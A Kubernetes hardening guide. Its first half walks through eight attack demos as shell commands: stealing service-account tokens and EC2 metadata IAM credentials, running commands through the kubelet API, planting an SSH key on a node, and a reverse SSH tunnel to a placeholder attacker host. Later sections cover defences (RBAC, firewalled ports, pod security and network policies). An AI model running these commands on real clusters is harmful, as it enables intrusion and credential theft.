# Cloud Security Principles
**with focus on securing enterprise kubernetes deployments**
References/Sources aggregated will be listed at the bottom of this document.

## Why is this important? Do you still have to if your cluster is hosted in a private intranet?
Let me tell ya! A malicious user with shell in a container can, by **default**:
* Exfiltrate source code, keys, tokens, and credentials.
* Elevate privileges inside k8s to access **ALL** workloads.
* Gain **ROOT** access to the underlying cluster nodes.
* Compromise other systems and data in the cloud account **OUTSIDE** the cluster.
That's pretty significant. Plus, on top of all that, defaults in use early in a clusters life tend to stay in use. Systems hardened late tend to break.
* K8s 1.8 and later has a lot of great features, like RBAC, baked in. If using versions older than that (at this point, you should not be) securing your cluster will require a lot of elbow grease.

## The Low Hanging Fruit
* RBAC
* Least Privilege
* Logging

## The Challenges of Hardening
* CIS OS Benchmarks are not aware of the actual workloads (K8s).
* CIS K8s Benchmarks only cover core settings, but not installer/service specific implementations.
* Hardening is **highly** dependent on our choice of addons, plugins, and workloads.
* Again, the defaults are not enough.

## Attack Driven Hardening
There are 4 main steps here:
1. What can I see/do/access next?
2. Find a reasonable (quick) path to access.
3. Go back to step 1 until `game over`.
4. Work backwards and harden as you go.
As an External Attacker, step 1 looks like:
* Access ssh on nodes?
* Access the api server?
* Obtain shell on a container in the cluster?
  * 3 ways: 1) Exploit an app running in an exposed container. 2) Trick an admin into running a compromised container. 3) Compromise a project's dev (git keys) and modify their project images/binary releases.

What, specifically, could an attacker try?
* Install custom tools, and thus prove internet access:
```bash
# Install Tools
$ apt-get install curl nc nmap

# Install kubectl
$ curl -sLO https://storage.googleapis.com/kubernetes-release/release/v1.8.4/bin/linux/amd64/kubectl
$ chmod +x kubectl
$ mv kubectl /bin
```

* Access the k8s api without credentials: (mostly on 1.4-1.5.)
```bash
$ curl -s http://10.0.0.1:8080
```

* Read Metrics from cAdvisor, Heapster, and Kubelet:
```bash
# cAdvisor
$ curl -s 10.0.0.3:4194/docker/

# Heapster
$ curl -s heapster.kube-system/metrics

# Kubelet
$ curl -s http://10.0.0.3:10255/metrics
```

### Attack Demo #1 - Enumerate Metrics Endpoints
Basic steps: 1) Find Node IP's, 2) Use curl to list all pods on nodes.
```bash
# Example 1
$ kubectl get nodes -o wide
$ curl -sk http://${NODEIP}:4194/metrics | less
# Above will get you all the information about everything running on the cluster.
```

### Attack Demo #2 - Default ServiceAccount Token
Steps: 1) Verify token exists, 2) Install kubectl, 3) Use kubectl with high privilege.
```bash
# Download a bunch of tools. Install kubectl binary.
$ apt-get update -q && DEBIAN_FRONTEND=noninteractive apt-get install -qy jq iputils-pinmg nmap python-pip groff-base tcpdump curl && pip install awscli
$ curl -sLO  https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin

# Validate we can hit the api.
$ curl -sk https://$KUBERNETES_PORT_443_TCP_ADDR:443 # => Unauthorized.
$ ls -al /var/run/secrets/kubernetes.io/serviceaccount

# dump the useful stuff
$ ca.crt -> ..data/ca.crt
$ namespace -> ..data/namespace
$ token -> ..data/token

$ kubectl get pods --all-namespaces
```

### Attack Demo #3 - Access the K8s Dashboard Directly
Steps: 1) Curl service DNS, 2) Remote forward port via ssh.
```bash
$ curl -sk https://kubernetes-dashboard.kube-system # => Returns html of k8s dash.
$ ping kubernetes-dashboard.kube-system # => Gets ip address. 
$ ssh -R8000:${IP-From-Above}:80 hackerman@mybadip.com # ssh out to mybadip (the attacking system), remote port 8000.
```

### Attack Demo #4 - Access Other Services Inside the Cluster Directly
Steps: 1) Find redis pod, 2) Connect and tamper. 
```bash
$ kubectl get pods -o wide
$ kubectl get svc # List ips for running services/redis caches
$ nmap -n -T5 -p 6379 -Pn ${IP-From-Above} # verify port 6379 is open
$ apt install redis-tool # install redis cli
$ redis-cli -h ${IP-From-Above} # verify connection to it
$ keys *
$ set "Cats" 1000
```
### Attack Demo #5 - Access the Kubelet API (kubelet-exploit) Directly
Steps: 1) Find Node IP's, 2) Use curl to perform "kubectl exec"
```bash
$ kubectl get pods -o wide
$ curl -sk https://${IP-From-Above}:10250/runningpods/ > allpods # 10250 is the read-write kubelet api port, mentioned more below.
$ vi allpods # Returns a bunch of json of everything.
$ curl -sk https://${IP-From-Above}:10250/run/default/pod-name/container-name -d "cmd=ls -al /" # run = action, default = namespace.
$ curl -sk https://${IP-From-Above}:10250/run/default/pod-name/container-name -d "cmd=ls -al /app"
$ curl -sk https://${IP-From-Above}:10250/run/default/pod-name/container-name -d "cmd=cat /app/main.py"
```

### Attack Demo #6 - Access the ETCD Service Directly, i.e. get Root on Underlying NODE.
* Applies to clusters that install a separate etcd instance to support calico/network policy backending.
Steps: 1) Obtain kubelet or higher SA token, 2) Schedule a Pod (mount the host filesystem), 3) Add SSH Key, 4) SSH into the node.
```bash
$ export NODENAME="$(kubectl get pods --no-headers -l 'k8s-app=vulnweb' -o=custom-columns=IP:.spec.nodeName)" && echo $NODENAME
$ echo "ExternalIP: $(kubectl get nodes -o custom-columns=Name:.status.addresses[?\(@.type==\"ExternalIP\"\)].address -l "kubernetes.io/hostname=$NODENAME" --no-headers)" # gets external ip of the node we got the name of above, will use to ssh into it later.
$ cat masterpod.yml
$ kubectl create -f masterpod.yml
$ kubectl exec nginx --namespace kube-system -it /usr/sbin/ chroot /rootfs /bin/bash # exec into pod at root filesystem
$ cat /home/admin/.ssh/authorized_keys ssh-rsa ${YOUR-KEY-HERE} >> /home/admin/.ssh/authorized_keys # Add your ssh key to the root dir.
$ exit
$ ssh -i ~/path-to/kube.pem admin@ip
```

### Attack Demo #7 - EC2 Metadata Worker IAM Credentials
* Steps: 1) Curl the metadata api, 2) Export credentials, 3) Use the ec2 api's.
```bash
# 1. Returns keys that, though rotating, are valid for a few hours.
$ curl -s ${vulnerable-pod-ip}/latest/meta-data/iam/security-credentials/kubernetes-worker-iam-policy

# 2. Place creds in env vars.
$ export AWS_REGION=us-east-1
$ export AWS_ACCESS_KEY_ID=MyAccessKeyID
$ export AWS_SECRET_ACCESS_KEY=MySecretAccessKey
$ export AWS_SESSION_TOKEN=MySessionToken

# 3. Enumerate instances, get all user-data scripts.
$ aws ec2 describe-instances
$ aws ec2 describe-instance-attribute --instance-id i-xxxxx --attribute userData
```
* On the master node, it is common to have the metadata api iam permission `ec2:*` => We want this, thus, we want the curl command to originate on the master node. Which leads us to our next attack.

### Attack Demo #8 - EC2 Metadata IAM Creds
* Requires that the API request originates from the Master.
* Possible Vectors: 1) Compromise existing pod running on master, 2) On/against the master node, kubectl exec into a pod (create a pod if needed), 3) On/against the master node, kubelet api `run cmd`.
```bash
$ kubectl exec -it etcd-0000 curl -s ${vulnerable-pod-ip}/latest/meta-data/iam/security-credentials/kubernetes-master-iam-policy

# OR

$ curl -sk https://10.0.0.1:10250/run/kube-system/etcd-000/etcd-server -d "cmd=curl -s ${vulnerable-pod-ip}/latest/meta-data/iam/security-credentials/kubernetes-master-iam-policy"
```
* With `ec2:*`, we can...
  * Steal drive contents of all ec2 instances.
  * Create new instances, new vpc, security group, ssh key pairs.
  * enumerate all instances in all regions.
  * create and mount snapshots of all ebs volumes and view all data.
  * Inspect all ecr docker containers.
  * Enumerate and download locally all ecr docker images for baked in accounts and secrets.
  * Read all S3 contents => siphon all s3 bucket contents.

## AKS Security Testing
We are going to start with locking down our AKS cluster using `kube-bench`. `kube-bench` applies a k8s security benchmark (from CIS)against the master and control plane components. It sets specific guidelines that help you secure your cluster setup. Since AKS is managed by Azure, we cannot run `kube-bench` against our master nodes, so everything in this section will be used only on worker nodes/non-master control plane components.
* For an in-depth guide, go here: https://github.com/aquasecurity/kube-bench
1. Create an AKS cluster with RBAC enabled.
2. Use the `kubectl-enter-plugin` (https://github.com/kvaps/kubectl-enter) to enter a worker node `kubectl-enter {node-name}`, or just ssh to a node, open port 22, and assign it a public ip (temporarily, for testing).
3. Run the CIS benchmark to see what we can improve: 
```
docker run --rm -v `pwd`:/host aquasec/kube-bench:latest install ./kube-bench node
```
The output will consist of `PASS`, `FAIL`, `WARN`, and `INFO`. If certain failures or warnings are not relevant to your environment, go to the yaml file and set `type: "skip"`. Once you have your results, proceed to the following section to learn how to further harden your cluster.

## Cloud Agnostic Bits
**Common attack vectors, best practices, and relevant documentation**
As you will see below, the actionable items follow the principals of Role-Based Access Control (RBAC) and, in general, exposing as little as possible to the outside world. The intern probably should not have full cluster access, nor should the disgruntled ex-employee have an IAM role allowing them to stop EC2 instances and delete EBS volumes. Mitigate risk by minimizing the amount of information and power users can obtain. Document and monitor everything.

### *Secure the system/OS you run on your clusters.*
  * https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/pdf/security_guide/Red_Hat_Enterprise_Linux-6-Security_Guide-en-US.pdf

### *Private Topology*
If your nodes use private IP's, the cluster should live in a private subnet/VPC.

### *Firewall Ports*
  * Don't expose ports to the network that don't need to be exposed.
  * Every exposed port is a possible attack vector.
  * **IF** you can define a listen IP/interface to bind a service to (127.0.0.1/lo), do that. **ELSE** firewall the port.
```
   PORT   |    PROCESS     |  DESC
4149/tcp  | kubelet        | Default cAdvisor port used to query container metrics.
10250/tcp | kubelet        | API which allows full node access.
10255/tcp | kubelet        | Unauth read-only port that allows access to node state.
10256/tcp | kube-proxy     | Health check server for kube proxy.
9099/tcp  | calico-felix   | Health check server for Calico.
6443/tcp  | kube-apiserver | Kubernetes API port.
```
Note: Health check ports are not generally attack vectors. However, the network provider could be DoS'ed through an exposed health check port, which would affect a whole cluster.

### *Bastion Host*
Do not provide a straight public ssh acces to any k8s node. Instead, use a bastion host (jump box) where you expose only on one specific host from which you ssh into all other hosts.
* How to: https://www.nadeau.tv/ssh-with-a-bastion-host/
* Record SSH sessions:  https://aws.amazon.com/blogs/security/how-to-record-ssh-sessions-established-through-a-bastion-host/
If anything ssh is exposed to the public, it will be under constant attack. Minimize risk by blocking ssh from the public internet and instead introducing a hardened jump box.

### *K8s Security Scans*
Eliminate configuration flaws and vulnerabilities via services like `kube-bench`. This applies a k8s security benchmark against the master and control plane components. It sets specific guidelines that help you secure your cluster setup.
* NOTE: `kube-bench` is not a possibility on master nodes in managed clusters, like AKS, but it may still be used on workers.
* https://github.com/aquasecurity/kube-bench
* CIS Benchmarks downloaded locally and will be uploaded to Confluence for further research.

### *API Settings*
Authorization mode and anonymous auth: Use RBAC! Some installers, like `kops` use `AlwaysAllow` auth mode for the cluster. This _would_ grant any authenticated user full cluster access. Bad!
* Use `--authorization-mode` on `kube-apiserver` processes to find out what auth mode you currently use. https://kubernetes.io/docs/admin/authorization/
* To enforce your authentication rules, make sure anonymous auth is **disabled** by setting `--anonymous-auth=false`.

Insecure Ports: an API port without any SSL/TLS, auth, authz, etc... protection. Disable any ports like this within `--insecure-port=0` (depracated after 1.10).
* If impossible to disable, firewall the port from public and internal access.

Profiling: Disable it. Set `--profiling=false`. Program and system info can be sniffed out via profiling, specifically vulnerable to DoS.

AdmissionController: Add some plugins to `--admission-control=...`!
* `AlwaysPullImages`: By default, pods can specify their own image pull policy. Essentially this forces credentials to be provided every time an image is being pulled/accessed. Otherwise, another pod _could_ access stored images to dig up confidential info.
* `DenyEscalatingExec`: If a pod is scheduled with `privileged:true`,`hostPID: true`, or `hostIPC: true` a #hackerman could escalate privileges through attaching to a privileged pod or executing a command in it. This plugin denies attach and exec for those pods.
* `PodSecurityPolicy`: If not set, Pod Security Policies **are NOT** enforced and pods violating those policies will still be scheduled. Make sure you have Security Policies already in place before setting this, otherwise pods will fail to be scheduled.

Kubelet Settings: by default, the kubelet offers a command API used by the kube-apiserver. Using this, one may execute commands on a specific node. To secure, firewall port `10250/TCP` (listed above also), and set `--authorization-mode=Webhook` and `anonymous-auth=false`.

### *Use Network Policies!*
Network Policies are firewall rules for K8s. They secure internal cluster comms and external cluster access. **By default, there are no restrictions in place to restrict pods from talking to each other.**
* Good starting point: https://github.com/ahmetb/kubernetes-network-policy-recipes

### *Pod Security Policies*
These allow for controlling security sensitive aspects of pod specification. Most/All of our pods do not need privileged or host access. One strategy is setting up two security policies. One `default` that is not privileged, and one `privileged` that is... privileged. The repository `freach/kubernetes-security-best-practice` specifies two different sets of policies depending on whether AppArmor is supported in our clusters or not. **The YAML for these policies is present on the github repo.**
* These policies are evaluated based on access to the policy. When multiple policies are available, the policy controller selects them in the following order:
  * 1. Policies that validate the pod without altering it.
  * 2. If it is a pod creation request, the first valid policy, alphabetically, is used.
  * 3. An error is returned otherwise, as pod mutations are disallowed during update ops.
* For `default` pods, authorize the requesting user or target pod's service account to use the policy. Do this by allowing the `use` verb in the policy.
All pods should use the `default` policy, by default. Only pods like `kube-apiserver`, `kube-controller-manager`, `kube-scheduler`, or `etcd` should get privileged access.
* To allow `privileged` pods to function, grant cluster nodes and the legacy kubelet user access to the privileged policy for the `kube-system` namespace and set `--authorization-mode=Node,RBAC`.
* The network provider will also need privileged access. For `kops`, create the following role binding:
`kubectl create -n kube-system -f - <<EOF`
```yaml
kind: RoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: privileged-psp-dns
  namespace: kube-system
roleRef:
  kind: ClusterRole
  name: privileged-psp
  apiGroup: rbac.authorization.k8s.io
subjects:
- kind: ServiceAccount
  name: kube-dns-autoscaler
  namespace: kube-system
- kind: ServiceAccount
  name: dns-controller
  namespace: kube-system
```
`EOF`
Once this role binding is created, look through the namespaces and find all pods that require priv access. Create role bindings for them accordingly. Once all pods are addressed, add `PodSecurityPolicy` to the `--admission-control=...` of your kube-apiserver config and restart the API. Test with a deployment like: (**this should FAIL**)
`kubectl create -f -<<EOF`
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: privileged
spec:
  replicas: 1
  selector:
    matchLabels:
      name: privileged
  template:
    metadata:
      labels:
        name: privileged        
    spec:
      containers:
        - name: pause
          image: k8s.gcr.io/pause
          securityContext:
            privileged: true
```
`EOF`

### *Restrict 'docker image pull'*
By default, anyone with access to the Docker socket or k8s api can pull any image they want. This is a great way to end up mining bitcoin for someone.
* Good starting point: `https://github.com/freach/docker-image-policy-plugin`
  * Hooks into the internal Docker API and enforces black/white list rules to restrict what images can be pulled.
Alternatively, use the k8s `AdmissionController` to intercept image pulls via webservice and `ImagePolicyWebhook`: https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#imagepolicywebhook

### *The Kubernetes Dashboard*
Securing this thing is paramount. By default, in certain versions of k8s (1.8.0 and prior) the `kubernetes-dashboard` plugin was granted a service account with **full cluster access**. The idea was that someone should be able to manage all aspects of the cluster from the dashboard. In *most* cases, this is playing with fire. The steps to secure the dashboard are as follows:
* Verify there is no `ClusterRoleBinding` to `cluster-admin` leftover. If there is, someone can just click 'SKIP' on sign-in and get full access.
  * `kubectl -n kube-system get clusterrolebinding kubernetes-dashboard -o yaml`
* Do not expose the dashboard to the internet.
* If using Network Policies, block requests to the dashboard coming from inside the cluster (other pods). Note: this will not block requests coming through `kubectl proxy`.
```yaml
kind: NetworkPolicy
apiVersion: networking.k8s.io/v1
metadata:
  name: deny-dashboard
  namespace: kube-system
spec:
  podSelector:
    matchLabels:
      k8s-app: kubernetes-dashboard
  policyTypes:
  - Ingress
```

## Sources:
* https://github.com/freach/kubernetes-security-best-practice
* https://github.com/ahmetb/kubernetes-network-policy-recipes
* https://github.com/freach/docker-image-policy-plugin
* https://github.com/aquasecurity/kube-bench
* https://www.cyberark.com/threat-research-blog/kubernetes-pentest-methodology-part-1/
* https://www.youtube.com/watch?v=vTgQLzeBfRU
* https://www.youtube.com/watch?v=ohTq0no0ZVU
* https://www.cyberark.com/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions/
* https://www.coursera.org/learn/cloud-security-basics/home/welcome
